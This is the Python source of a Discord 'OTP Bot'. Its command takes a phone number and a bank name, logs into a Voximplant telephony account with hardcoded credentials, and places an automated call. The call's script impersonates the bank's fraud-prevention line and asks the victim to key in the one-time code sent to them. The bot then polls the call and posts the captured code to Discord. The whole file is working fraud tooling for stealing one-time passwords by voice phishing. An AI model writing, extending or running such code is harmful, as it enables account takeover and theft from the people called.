import os
from discord.ext import commands
from dotenv import load_dotenv
from discord.ext import tasks
import requests
import time
import simplejson

headers = {
        'Host' : 'kitapi-us.voximplant.com',
        'Connection' : 'keep-alive',
        'Accept' : 'application/json, text/plain, */*',
        'sec-ch-ua-mobile' : '?0',
        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
        'Content-Type' : 'application/x-www-form-urlencoded',
        'Origin' : 'https://kit-us.voximplant.com',
        'Sec-Fetch-Site' : 'same-site',
        'Sec-Fetch-Mode' : 'cors',
        'Sec-Fetch-Dest' : 'empty',
        'Referer' : 'https://kit-us.voximplant.com/',
        'Accept-Language' : 'es-419,es;q=0.9',
        'Cache-Control' : 'no-cache',
        'Accept-Encoding' : 'gzip, deflate'

}

load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

bot = commands.Bot(command_prefix='!')
content_ae = ""
credit_real = ""

@bot.command(name='startpepe')
async def pruebaA(ctx):  
     await ctx.author.send("Hi, I'm The OTP Bot, I'm At Your Disposal")

@bot.command(name='OTP_USA')
async def prueba(ctx, telephone, banca):
    headers_pi = {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Pragma' : 'no-cache',
    'Accept' : '*/*' 
}

    headers_pa = {
            'accept' : 'application/json, text/plain, */*',
            'accept-encoding' : 'gzip, deflate, br',
            'accept-language' : 'es-US,es-419;q=0.9,es;q=0.8,en;q=0.7',
            'content-type' : 'application/x-www-form-urlencoded',
            'Origin' : 'https://kit-us.voximplant.com',
            'Sec-Fetch-Site' : 'same-site',
            'Sec-Fetch-Mode' : 'cors',
            'Sec-Fetch-Dest' : 'empty',
            'Referer' : 'https://kit-us.voximplant.com/',
            'Accept-Language' : 'es-419,es;q=0.9',
            'Cache-Control' : 'no-cache',
            'Accept-Encoding' : 'gzip, deflate',
            'user-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'
    }
    url = 'https://kitapi-us.voximplant.com/api/v2/auth/getAccessToken'
    x_za = requests.post(url, data = "domain=bancoppelex&email=bancoppelexpreess%40gmail.com&password=Carambazoz21%2A", headers = headers_pa)
    url_token_pa = ((x_za.text).split("result\":\"", 1)[-1]).split("\"}", 1)[0]
    myobj = "scenario_id=21652&json_full=%7B%22cells%22%3A%5B%7B%22type%22%3A%22standard.Link%22%2C%22z%22%3A0%2C%22version%22%3A2%2C%22source%22%3A%7B%22id%22%3A%2226edf9e7-c278-4593-a6c4-ec81af064a00%22%2C%22magnet%22%3A%22circle%22%2C%22port%22%3A%22voiceMailDetection%22%7D%2C%22target%22%3A%7B%22id%22%3A%223d3dad12-21d9-4aa7-9a85-db0fde9456dc%22%2C%22port%22%3A%22TERMINATE%22%7D%2C%22id%22%3A%227c3dd395-c4d0-4795-9c20-94138fd86cf2%22%7D%2C%7B%22type%22%3A%22standard.Link%22%2C%22z%22%3A0%2C%22version%22%3A2%2C%22source%22%3A%7B%22id%22%3A%22e80df87d-24b7-47fd-bbcd-7bdf560f7ae0%22%2C%22magnet%22%3A%22circle%22%2C%22port%22%3A%22BUTTONS%22%7D%2C%22target%22%3A%7B%22id%22%3A%2229906867-e2b0-4481-ab90-1c9bddecf28a%22%2C%22port%22%3A%22IN%22%7D%2C%22id%22%3A%2216c10ecf-8b8b-424b-926c-03b7002d7fd0%22%7D%2C%7B%22type%22%3A%22standard.Link%22%2C%22z%22%3A0%2C%22version%22%3A2%2C%22source%22%3A%7B%22id%22%3A%2229906867-e2b0-4481-ab90-1c9bddecf28a%22%2C%22magnet%22%3A%22circle%22%2C%22port%22%3A%22OUT%22%7D%2C%22target%22%3A%7B%22id%22%3A%22f99e148b-ad78-4472-b12d-c9327cd2dae4%22%2C%22port%22%3A%22IN%22%7D%2C%22id%22%3A%22016567d8-48a8-44e7-a310-85430cee1dd3%22%7D%2C%7B%22type%22%3A%22standard.Link%22%2C%22z%22%3A0%2C%22version%22%3A2%2C%22source%22%3A%7B%22id%22%3A%2228026e86-a334-466c-aade-cdb590954e91%22%2C%22magnet%22%3A%22circle%22%2C%22port%22%3A%22OUT%22%7D%2C%22target%22%3A%7B%22id%22%3A%22e80df87d-24b7-47fd-bbcd-7bdf560f7ae0%22%2C%22port%22%3A%22IN%22%7D%2C%22id%22%3A%22a6ccd7ca-9f8b-4a67-b53c-41d1ed2eb5cc%22%7D%2C%7B%22type%22%3A%22standard.Link%22%2C%22z%22%3A0%2C%22version%22%3A2%2C%22source%22%3A%7B%22id%22%3A%2226edf9e7-c278-4593-a6c4-ec81af064a00%22%2C%22port%22%3A%22ERROR%22%7D%2C%22target%22%3A%7B%22id%22%3A%22b169fc04-e3ac-46cd-86cc-aab3a2a71577%22%2C%22port%22%3A%22TERMINATE%22%7D%2C%22id%22%3A%221409e63c-6947-4eae-b68f-67dbf5c433e7%22%7D%2C%7B%22type%22%3A%22standard.Link%22%2C%22z%22%3A0%2C%22version%22%3A2%2C%22source%22%3A%7B%22id%22%3A%2226edf9e7-c278-4593-a6c4-ec81af064a00%22%2C%22magnet%22%3A%22circle%22%2C%22port%22%3A%22SUCCESS%22%7D%2C%22target%22%3A%7B%22id%22%3A%22f439e95d-b145-4f35-9741-17e580a11471%22%2C%22port%22%3A%22IN%22%7D%2C%22id%22%3A%222607d26e-9666-4d5c-9b22-f45766c85c4a%22%7D%2C%7B%22type%22%3A%22standard.Link%22%2C%22z%22%3A0%2C%22version%22%3A2%2C%22source%22%3A%7B%22id%22%3A%22830c5ba4-630d-4e72-9b88-13cc2dfa418f%22%2C%22magnet%22%3A%22circle%22%2C%22port%22%3A%22OUT%22%7D%2C%22target%22%3A%7B%22id%22%3A%22e80df87d-24b7-47fd-bbcd-7bdf560f7ae0%22%2C%22port%22%3A%22IN%22%7D%2C%22id%22%3A%22e353648a-42a2-466b-a3f4-eb3cb46b557c%22%7D%2C%7B%22type%22%3A%22standard.Link%22%2C%22z%22%3A0%2C%22version%22%3A2%2C%22source%22%3A%7B%22id%22%3A%22f439e95d-b145-4f35-9741-17e580a11471%22%2C%22magnet%22%3A%22circle%22%2C%22port%22%3A%22OUT%22%7D%2C%22target%22%3A%7B%22id%22%3A%22a34a97bd-e202-40f4-bb8f-b8aa7f132c8f%22%2C%22port%22%3A%22IN%22%7D%2C%22id%22%3A%2293bb87ae-686f-4a9a-b969-e3edad59be52%22%7D%2C%7B%22type%22%3A%22standard.Link%22%2C%22z%22%3A0%2C%22version%22%3A2%2C%22source%22%3A%7B%22id%22%3A%22a34a97bd-e202-40f4-bb8f-b8aa7f132c8f%22%2C%22magnet%22%3A%22circle%22%2C%22port%22%3A%22OUT%22%7D%2C%22target%22%3A%7B%22id%22%3A%22ec282ae2-c452-4a6c-bcc0-21069d43c322%22%2C%22port%22%3A%22IN%22%7D%2C%22id%22%3A%221b453893-4066-4005-ba05-a65926eee918%22%7D%2C%7B%22type%22%3A%22standard.Link%22%2C%22z%22%3A0%2C%22version%22%3A2%2C%22source%22%3A%7B%22id%22%3A%22ec282ae2-c452-4a6c-bcc0-21069d43c322%22%2C%22magnet%22%3A%22circle%22%2C%22port%22%3A%22OUT%22%7D%2C%22target%22%3A%7B%22id%22%3A%22830c5ba4-630d-4e72-9b88-13cc2dfa418f%22%2C%22port%22%3A%22IN%22%7D%2C%22id%22%3A%227732842b-96a6-4e4f-9678-e209f7ce9265%22%7D%2C%7B%22type%22%3A%22standard.Link%22%2C%22z%22%3A0%2C%22version%22%3A2%2C%22source%22%3A%7B%22id%22%3A%22e80df87d-24b7-47fd-bbcd-7bdf560f7ae0%22%2C%22magnet%22%3A%22circle%22%2C%22port%22%3A%22NOINPUT%22%7D%2C%22target%22%3A%7B%22id%22%3A%2228026e86-a334-466c-aade-cdb590954e91%22%2C%22port%22%3A%22IN%22%7D%2C%22id%22%3A%224ba478ab-6e89-4f09-be97-f26d6e5c3db2%22%7D%2C%7B%22type%22%3A%22smartcalls.ScenarioStart%22%2C%22model%22%3Anull%2C%22ports%22%3A%7B%22items%22%3A%5B%7B%22id%22%3A%22START%22%2C%22group%22%3A%22out%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22%22%7D%7D%7D%5D%7D%2C%22block_type%22%3A%22ScenarioStart%22%2C%22version%22%3A2%2C%22size%22%3A%7B%22width%22%3A140%2C%22height%22%3A140%7D%2C%22locked%22%3Afalse%2C%22attention%22%3Afalse%2C%22position%22%3A%7B%22x%22%3A144%2C%22y%22%3A286%7D%2C%22id%22%3A%224928b80a-92d2-4be0-8827-3f96ac629ec0%22%2C%22z%22%3A1%2C%22attrs%22%3A%7B%22label%22%3A%7B%22textWrap%22%3A%7B%22text%22%3A%22Scenario%5CnStart%22%7D%7D%7D%7D%2C%7B%22type%22%3A%22smartcalls.CallEnd%22%2C%22model%22%3A%7B%22blockLabel%22%3A%22%22%7D%2C%22ports%22%3A%7B%22items%22%3A%5B%7B%22id%22%3A%22TERMINATE%22%2C%22group%22%3A%22in%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22%22%7D%7D%7D%5D%7D%2C%22block_type%22%3A%22CallEnd%22%2C%22version%22%3A2%2C%22size%22%3A%7B%22width%22%3A140%2C%22height%22%3A140%7D%2C%22locked%22%3Afalse%2C%22attention%22%3Afalse%2C%22position%22%3A%7B%22x%22%3A950%2C%22y%22%3A150%7D%2C%22id%22%3A%22b169fc04-e3ac-46cd-86cc-aab3a2a71577%22%2C%22z%22%3A2%2C%22attrs%22%3A%7B%22label%22%3A%7B%22textWrap%22%3A%7B%22text%22%3A%22Scenario%5CnEnd%22%7D%7D%7D%7D%2C%7B%22type%22%3A%22smartcalls.SuccessAttempt%22%2C%22model%22%3A%7B%22blockLabel%22%3A%22%22%7D%2C%22ports%22%3A%7B%22items%22%3A%5B%7B%22id%22%3A%22IN%22%2C%22group%22%3A%22in%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22%22%7D%7D%7D%2C%7B%22id%22%3A%22SUCCESS%22%2C%22group%22%3A%22out%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22Success%22%7D%7D%7D%5D%7D%2C%22block_type%22%3A%22SuccessAttempt%22%2C%22version%22%3A2%2C%22size%22%3A%7B%22width%22%3A260%2C%22height%22%3A96%7D%2C%22locked%22%3Afalse%2C%22attention%22%3Afalse%2C%22position%22%3A%7B%22x%22%3A4070%2C%22y%22%3A680%7D%2C%22id%22%3A%22f99e148b-ad78-4472-b12d-c9327cd2dae4%22%2C%22z%22%3A14%2C%22attrs%22%3A%7B%22label%22%3A%7B%22textWrap%22%3A%7B%22text%22%3A%22Successful%20Call%22%7D%7D%7D%7D%2C%7B%22type%22%3A%22smartcalls.CallEnd%22%2C%22model%22%3A%7B%22blockLabel%22%3A%22%22%7D%2C%22ports%22%3A%7B%22items%22%3A%5B%7B%22id%22%3A%22TERMINATE%22%2C%22group%22%3A%22in%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22%22%7D%7D%7D%5D%7D%2C%22block_type%22%3A%22CallEnd%22%2C%22version%22%3A2%2C%22size%22%3A%7B%22width%22%3A140%2C%22height%22%3A140%7D%2C%22locked%22%3Afalse%2C%22attention%22%3Afalse%2C%22position%22%3A%7B%22x%22%3A4950%2C%22y%22%3A280%7D%2C%22id%22%3A%22955a609d-824d-4a85-85c5-eb9416d9ffe3%22%2C%22z%22%3A17%2C%22attrs%22%3A%7B%22label%22%3A%7B%22textWrap%22%3A%7B%22text%22%3A%22Scenario%5CnEnd%22%7D%7D%7D%7D%2C%7B%22type%22%3A%22smartcalls.TTSPlayer%22%2C%22model%22%3A%7B%22blockLabel%22%3A%22%22%2C%22ttsText%22%3A%22welcome%20to%20the%20" + banca+"%20fraud%20prevention%20line%2C%20we%20recently%20sent%20you%20a%20code%20for%20an%20online%20purchase%20or%20registration%20attempt%2C%20if%20you%20did%20not%20go%20through%20it%2C%20press%201.%22%2C%22ttsLanguage%22%3A%22VoiceList.Microsoft%22%2C%22ttsVoice%22%3A%22Neural.en_US_AriaNeural%22%7D%2C%22ports%22%3A%7B%22items%22%3A%5B%7B%22id%22%3A%22IN%22%2C%22group%22%3A%22in%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22%22%7D%7D%7D%2C%7B%22id%22%3A%22OUT%22%2C%22group%22%3A%22out%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22Out%22%7D%7D%7D%5D%7D%2C%22block_type%22%3A%22TTSPlayer%22%2C%22version%22%3A5%2C%22size%22%3A%7B%22width%22%3A260%2C%22height%22%3A96%7D%2C%22locked%22%3Afalse%2C%22attention%22%3Afalse%2C%22position%22%3A%7B%22x%22%3A1270%2C%22y%22%3A110%7D%2C%22id%22%3A%22a34a97bd-e202-40f4-bb8f-b8aa7f132c8f%22%2C%22z%22%3A24%2C%22offsetX%22%3A440%2C%22offsetY%22%3A560%2C%22attrs%22%3A%7B%22label%22%3A%7B%22textWrap%22%3A%7B%22text%22%3A%22Text%20to%20Speech%22%7D%7D%7D%7D%2C%7B%22type%22%3A%22smartcalls.CallPSTN%22%2C%22model%22%3A%7B%22blockLabel%22%3A%22%22%2C%22number%22%3A%22%7B%7Bphone%7D%7D%22%2C%22vmd%22%3Atrue%2C%22use_callerId%22%3Afalse%2C%22callerId_variable%22%3A%22%22%2C%22pseudocallback%22%3A%7B%22use_callback%22%3Afalse%2C%22json%22%3Anull%2C%22requestMeta%22%3A%7B%7D%2C%22variables%22%3A%5B%5D%2C%22isTested%22%3Afalse%7D%7D%2C%22ports%22%3A%7B%22items%22%3A%5B%7B%22id%22%3A%22IN%22%2C%22group%22%3A%22in%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22%22%7D%7D%7D%2C%7B%22id%22%3A%22ERROR%22%2C%22group%22%3A%22out%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22Fail%22%7D%7D%7D%2C%7B%22id%22%3A%22SUCCESS%22%2C%22group%22%3A%22out%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22Success%22%7D%7D%7D%2C%7B%22id%22%3A%22voiceMailDetection%22%2C%22group%22%3A%22out%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22Voicemail%22%7D%7D%7D%5D%7D%2C%22block_type%22%3A%22CallPSTN%22%2C%22version%22%3A3%2C%22size%22%3A%7B%22width%22%3A260%2C%22height%22%3A167%7D%2C%22locked%22%3Afalse%2C%22attention%22%3Afalse%2C%22position%22%3A%7B%22x%22%3A504%2C%22y%22%3A286%7D%2C%22id%22%3A%2226edf9e7-c278-4593-a6c4-ec81af064a00%22%2C%22z%22%3A25%2C%22attrs%22%3A%7B%22label%22%3A%7B%22textWrap%22%3A%7B%22text%22%3A%22Outbound%20Call%22%7D%7D%7D%7D%2C%7B%22type%22%3A%22smartcalls.CallEnd%22%2C%22model%22%3A%7B%22blockLabel%22%3A%22%22%7D%2C%22ports%22%3A%7B%22items%22%3A%5B%7B%22id%22%3A%22TERMINATE%22%2C%22group%22%3A%22in%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22%22%7D%7D%7D%5D%7D%2C%22block_type%22%3A%22CallEnd%22%2C%22version%22%3A2%2C%22size%22%3A%7B%22width%22%3A140%2C%22height%22%3A140%7D%2C%22locked%22%3Afalse%2C%22attention%22%3Afalse%2C%22position%22%3A%7B%22x%22%3A820%2C%22y%22%3A550%7D%2C%22id%22%3A%223d3dad12-21d9-4aa7-9a85-db0fde9456dc%22%2C%22z%22%3A26%2C%22attrs%22%3A%7B%22label%22%3A%7B%22textWrap%22%3A%7B%22text%22%3A%22Scenario%5CnEnd%22%7D%7D%7D%7D%2C%7B%22type%22%3A%22smartcalls.GatherInput%22%2C%22model%22%3A%7B%22blockLabel%22%3A%22%22%2C%22block_timeout%22%3A10%2C%22asr_enabled%22%3Afalse%2C%22asr_language%22%3A%22Microsoft.es_MX%22%2C%22asr_exit_result%22%3Atrue%2C%22asr_varname%22%3A%22%22%2C%22buttons_varname%22%3A%22%7B%7Bbtn_input%7D%7D%22%2C%22buttons_enabled%22%3Atrue%2C%22buttons_stopFlag%22%3Atrue%2C%22buttons_stopChars%22%3A%22%23%22%2C%22buttons_limit%22%3A20%2C%22buttons_delayMax%22%3A%222000%22%7D%2C%22ports%22%3A%7B%22items%22%3A%5B%7B%22id%22%3A%22IN%22%2C%22group%22%3A%22in%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22%22%7D%7D%7D%2C%7B%22id%22%3A%22NOINPUT%22%2C%22group%22%3A%22out%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22NO%20INPUT%22%7D%7D%7D%2C%7B%22id%22%3A%22BUTTONS%22%2C%22group%22%3A%22out%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22Keyboard%22%7D%7D%7D%5D%7D%2C%22block_type%22%3A%22GatherInput%22%2C%22version%22%3A3%2C%22size%22%3A%7B%22width%22%3A260%2C%22height%22%3A131%7D%2C%22locked%22%3Afalse%2C%22attention%22%3Afalse%2C%22position%22%3A%7B%22x%22%3A3390%2C%22y%22%3A110%7D%2C%22id%22%3A%22e80df87d-24b7-47fd-bbcd-7bdf560f7ae0%22%2C%22z%22%3A27%2C%22attrs%22%3A%7B%22label%22%3A%7B%22textWrap%22%3A%7B%22text%22%3A%22Answer%20Recognition%22%7D%7D%7D%7D%2C%7B%22type%22%3A%22smartcalls.TTSPlayer%22%2C%22model%22%3A%7B%22blockLabel%22%3A%22%22%2C%22ttsText%22%3A%22Please%20enter%20the%20code%20again%20that%20we%20have%20sent%20to%20your%20cell%20phone%20in%20order%20to%20cancel%20the%20request.%22%2C%22ttsLanguage%22%3A%22VoiceList.Microsoft%22%2C%22ttsVoice%22%3A%22Neural.en_US_AriaNeural%22%7D%2C%22ports%22%3A%7B%22items%22%3A%5B%7B%22id%22%3A%22IN%22%2C%22group%22%3A%22in%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22%22%7D%7D%7D%2C%7B%22id%22%3A%22OUT%22%2C%22group%22%3A%22out%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22Out%22%7D%7D%7D%5D%7D%2C%22block_type%22%3A%22TTSPlayer%22%2C%22version%22%3A5%2C%22size%22%3A%7B%22width%22%3A260%2C%22height%22%3A96%7D%2C%22locked%22%3Afalse%2C%22attention%22%3Afalse%2C%22position%22%3A%7B%22x%22%3A2820%2C%22y%22%3A-340%7D%2C%22id%22%3A%2228026e86-a334-466c-aade-cdb590954e91%22%2C%22z%22%3A28%2C%22offsetX%22%3A170%2C%22offsetY%22%3A400%2C%22attrs%22%3A%7B%22label%22%3A%7B%22textWrap%22%3A%7B%22text%22%3A%22Text%20to%20Speech%22%7D%7D%7D%7D%2C%7B%22type%22%3A%22smartcalls.TTSPlayer%22%2C%22model%22%3A%7B%22blockLabel%22%3A%22%22%2C%22ttsText%22%3A%22The%20request%20has%20been%20cancelled%20correctly%22%2C%22ttsLanguage%22%3A%22VoiceList.Microsoft%22%2C%22ttsVoice%22%3A%22Neural.en_US_AriaNeural%22%7D%2C%22ports%22%3A%7B%22items%22%3A%5B%7B%22id%22%3A%22IN%22%2C%22group%22%3A%22in%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22%22%7D%7D%7D%2C%7B%22id%22%3A%22OUT%22%2C%22group%22%3A%22out%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22Out%22%7D%7D%7D%5D%7D%2C%22block_type%22%3A%22TTSPlayer%22%2C%22version%22%3A5%2C%22size%22%3A%7B%22width%22%3A260%2C%22height%22%3A96%7D%2C%22locked%22%3Afalse%2C%22attention%22%3Afalse%2C%22position%22%3A%7B%22x%22%3A3970%2C%22y%22%3A330%7D%2C%22id%22%3A%2229906867-e2b0-4481-ab90-1c9bddecf28a%22%2C%22z%22%3A29%2C%22offsetX%22%3A90%2C%22offsetY%22%3A80%2C%22attrs%22%3A%7B%22label%22%3A%7B%22textWrap%22%3A%7B%22text%22%3A%22Text%20to%20Speech%22%7D%7D%7D%7D%2C%7B%22type%22%3A%22standard.Link%22%2C%22z%22%3A30%2C%22version%22%3A2%2C%22source%22%3A%7B%22id%22%3A%224928b80a-92d2-4be0-8827-3f96ac629ec0%22%2C%22port%22%3A%22START%22%7D%2C%22target%22%3A%7B%22id%22%3A%2226edf9e7-c278-4593-a6c4-ec81af064a00%22%2C%22port%22%3A%22IN%22%7D%2C%22id%22%3A%226d258f90-1b81-4c92-9745-c8eb42e89560%22%7D%2C%7B%22type%22%3A%22smartcalls.Pause%22%2C%22model%22%3A%7B%22blockLabel%22%3A%22%22%2C%22value%22%3A1%7D%2C%22ports%22%3A%7B%22items%22%3A%5B%7B%22id%22%3A%22IN%22%2C%22group%22%3A%22in%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22%22%7D%7D%7D%2C%7B%22id%22%3A%22OUT%22%2C%22group%22%3A%22out%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22Out%22%7D%7D%7D%5D%7D%2C%22block_type%22%3A%22Pause%22%2C%22version%22%3A2%2C%22size%22%3A%7B%22width%22%3A260%2C%22height%22%3A96%7D%2C%22locked%22%3Afalse%2C%22attention%22%3Afalse%2C%22position%22%3A%7B%22x%22%3A940%2C%22y%22%3A410%7D%2C%22id%22%3A%22f439e95d-b145-4f35-9741-17e580a11471%22%2C%22z%22%3A31%2C%22attrs%22%3A%7B%7D%7D%2C%7B%22type%22%3A%22smartcalls.TTSPlayer%22%2C%22model%22%3A%7B%22blockLabel%22%3A%22%22%2C%22ttsText%22%3A%22For%20security%20reasons%2C%20in%20order%20for%20us%20to%20block%20this%20request%2C%20we%20will%20need%20to%20confirm%20your%20identity%2C%20enter%20the%20code%20we%20have%20sent%20to%20your%20cell%20phone%20and%20press%20the%20number%20key%20to%20confirm.%22%2C%22ttsLanguage%22%3A%22VoiceList.Microsoft%22%2C%22ttsVoice%22%3A%22Neural.en_US_AriaNeural%22%7D%2C%22ports%22%3A%7B%22items%22%3A%5B%7B%22id%22%3A%22IN%22%2C%22group%22%3A%22in%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22%22%7D%7D%7D%2C%7B%22id%22%3A%22OUT%22%2C%22group%22%3A%22out%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22Out%22%7D%7D%7D%5D%7D%2C%22block_type%22%3A%22TTSPlayer%22%2C%22version%22%3A5%2C%22size%22%3A%7B%22width%22%3A260%2C%22height%22%3A96%7D%2C%22locked%22%3Afalse%2C%22attention%22%3Afalse%2C%22position%22%3A%7B%22x%22%3A2000%2C%22y%22%3A240%7D%2C%22id%22%3A%22830c5ba4-630d-4e72-9b88-13cc2dfa418f%22%2C%22z%22%3A33%2C%22attrs%22%3A%7B%22label%22%3A%7B%22textWrap%22%3A%7B%22text%22%3A%22Text%20to%20Speech%22%7D%7D%7D%7D%2C%7B%22type%22%3A%22smartcalls.Pause%22%2C%22model%22%3A%7B%22blockLabel%22%3A%22%22%2C%22value%22%3A5%7D%2C%22ports%22%3A%7B%22items%22%3A%5B%7B%22id%22%3A%22IN%22%2C%22group%22%3A%22in%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22%22%7D%7D%7D%2C%7B%22id%22%3A%22OUT%22%2C%22group%22%3A%22out%22%2C%22attrs%22%3A%7B%22text%22%3A%7B%22text%22%3A%22Out%22%7D%7D%7D%5D%7D%2C%22block_type%22%3A%22Pause%22%2C%22version%22%3A2%2C%22size%22%3A%7B%22width%22%3A260%2C%22height%22%3A96%7D%2C%22locked%22%3Afalse%2C%22attention%22%3Afalse%2C%22position%22%3A%7B%22x%22%3A1590%2C%22y%22%3A220%7D%2C%22id%22%3A%22ec282ae2-c452-4a6c-bcc0-21069d43c322%22%2C%22z%22%3A36%2C%22attrs%22%3A%7B%7D%7D%2C%7B%22type%22%3A%22standard.Link%22%2C%22z%22%3A37%2C%22version%22%3A2%2C%22source%22%3A%7B%22id%22%3A%22f99e148b-ad78-4472-b12d-c9327cd2dae4%22%2C%22port%22%3A%22SUCCESS%22%7D%2C%22target%22%3A%7B%22id%22%3A%22955a609d-824d-4a85-85c5-eb9416d9ffe3%22%2C%22port%22%3A%22TERMINATE%22%7D%2C%22id%22%3A%22d311293c-4c65-40d0-822c-b48f0bfbc33e%22%7D%5D%7D&variables=%7B%22phone%22%3A%22%2B" + telephone+"%22%2C%22UTC%22%3A%22UTC%22%2C%22phone_number_id%22%3A2958%2C%22caller_id%22%3Anull%2C%22btn_input%22%3A%22%22%7D"
    url = 'https://kitapi-us.voximplant.com/api/v3/scenario/testScenario?domain=bancoppelex&access_token=' + url_token_pa
    x = requests.post(url, data = myobj, headers = headers)
    url_token = ((x.text).split(",\"media_session_access_secure_url\":\"", 1)[-1]).split("\",\"", 1)[0]
    r = requests.get(url_token)  
    await ctx.send('Getting OTP...')      
    try:
         
        while True: 
            r = requests.get(url_token) 
            kaka = ((r.text).split("\"call_result_code\":", 1)[-1]).split("},\"", 1)[0]
            if r.text.find("TERMINATED") != -1:
                print("PROGRESSING")
                await ctx.author.send("The Customer Terminated The Call Or The Number Is Wrong!")
                break
            else:     
                if r.text.find("TERMINATED") != -1:
                     print("PROGRESSING")
                     await ctx.author.send("The Customer Terminated The Call Or The Number Is Wrong!")
                     break
                else:                  
                    TOP_TOKEN = ((r.text).split("\"btn_input\":\"", 1)[-1]).split("\"}", 1)[0]
                if not TOP_TOKEN:
                    continue   
                else: 
                    time.sleep(10) 
                    print(r.text)
                    await ctx.send('OTP:' + TOP_TOKEN)
                    print(r.text)
                    break                            
    except Exception as e:
        raise e  
    
bot.run(TOKEN)    
        
         
            
